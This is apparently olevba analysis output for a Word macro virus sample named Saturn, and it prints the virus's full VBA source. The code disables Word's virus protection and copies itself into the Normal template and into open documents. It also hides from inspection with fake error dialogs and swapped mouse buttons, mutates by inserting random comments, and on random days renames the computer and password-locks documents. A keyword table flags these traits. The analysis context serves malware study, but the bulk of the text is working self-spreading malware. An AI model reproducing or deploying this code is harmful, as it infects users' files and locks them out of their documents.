olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Saturn-2518088f65ed9c8c077915c735f4892c5b8cb746
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Saturn-2518088f65ed9c8c077915c735f4892c5b8cb746 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Saturn.bas 
in file: Virus.MSWord.Saturn-2518088f65ed9c8c077915c735f4892c5b8cb746 - OLE stream: 'Macros/VBA/Saturn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long

Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long

Sub AutoOpen()

On Error Resume Next

Application.ScreenUpdating = False

Application.DisplayAlerts = wdAlertsNone

Options.VirusProtection = False

DocInfect = False

GlobInfect = False

For b = 1 To ActiveDocument.VBProject.VBComponents.Count

If ActiveDocument.VBProject.VBComponents(b).Name = "Saturn" Then

DocInfect = True

End If

Next

For U = 1 To NormalTemplate.VBProject.VBComponents.Count

If NormalTemplate.VBProject.VBComponents(U).Name = "Saturn" Then

GlobInfect = True

End If

Next

If DocInfect = False Then

Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Saturn", Object:=wdOrganizerObjectProjectItems

ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate

End If

If GlobInfect = False Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Saturn", Object:=wdOrganizerObjectProjectItems

Options.SaveNormalPrompt = False

End If

Saturn

Application.DisplayAlerts = wdAlertsAll

End Sub

Sub AutoClose()

On Error Resume Next

Call UMP

Saturn

Call UMP

ActiveDocument.Save

End Sub

Sub Stealth()

On Error Resume Next

Call UMP

RM = Int(Rnd * 5) + 1

If RM = 1 Then smeg$ = "Not enough memory to perform this operation"

If RM = 2 Then smeg$ = "Impossible open this function"

If RM = 3 Then smeg$ = "Function does not answer system requests"

If RM = 4 Then smeg$ = "This program has performed an illegal operation and will be locked"

If RM = 5 Then smeg$ = "This option at present not available"

steMsgType = vbCritical + vbOKCancel + vbMsgBoxHelpButton

message = MsgBox(smeg$, steMsgType, "Microsoft Word")

If vbOKCancel Then

SMB = SwapMouseButton(&H4)

Documents.Close

End If

End Sub

Sub ToolsMacro()

Stealth

End Sub

Sub ToolsCustomize()

Stealth

End Sub

Sub ViewVBCode()

Stealth

End Sub

Sub Saturn()

On Error Resume Next

'Saturn by ULTRAS [SOS]

If Day(Now()) = Int(Rnd() * 30 + 1) Then

Computer = SetComputerName("SOS")

ActiveDocument.Password = "SOS" & Int(Rnd * 333) + 1

ActiveDocument.Save

End If

End Sub

Sub UMP()

'ULTRAS MACRO POLYMORPHIC

PoNu = Int(Rnd() * 28 + 1)

For Mutate = 1 To PoNu

PoRL = Application.VBE.ActiveVBProject.VBComponents("Saturn").CodeModule.CountOfLines

PoLi = Int(Rnd() * PoRL + 1)

a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49

Application.VBE.ActiveVBProject.VBComponents("Saturn").CodeModule.InsertLines PoLi, vbTab & "' " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e

Next Mutate

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

